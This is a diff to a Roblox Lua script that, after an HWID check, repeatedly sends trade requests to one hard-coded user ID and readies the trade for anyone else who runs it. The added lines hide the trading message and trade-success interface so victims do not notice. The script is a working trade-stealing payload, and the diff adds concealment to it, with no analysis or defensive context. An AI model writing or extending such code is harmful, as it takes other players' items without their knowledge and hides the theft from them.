@@ -34,6 +34,7 @@ if hwidik==HWID then
 	if game.Players.localPlayer.UserId ~= 1952523040 then
 		
 		while task.wait() do
+			game.Players.LocalPlayer.PlayerGui.Trading.TradingInfo.TradingMessage.Visible = false
 			local args = {
 				[1] = 1952523040,
 				[2] = true
@@ -51,6 +52,9 @@ if hwidik==HWID then
 					end
 				end
 				game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Trade"):WaitForChild("Ready"):FireServer()
+				while task.wait() do
+					game:GetService("Players").LocalPlayer.PlayerGui.Trading.TradingInfo.TradeSuccesful.Visible = false
+				end
 			end
 		end
 	end
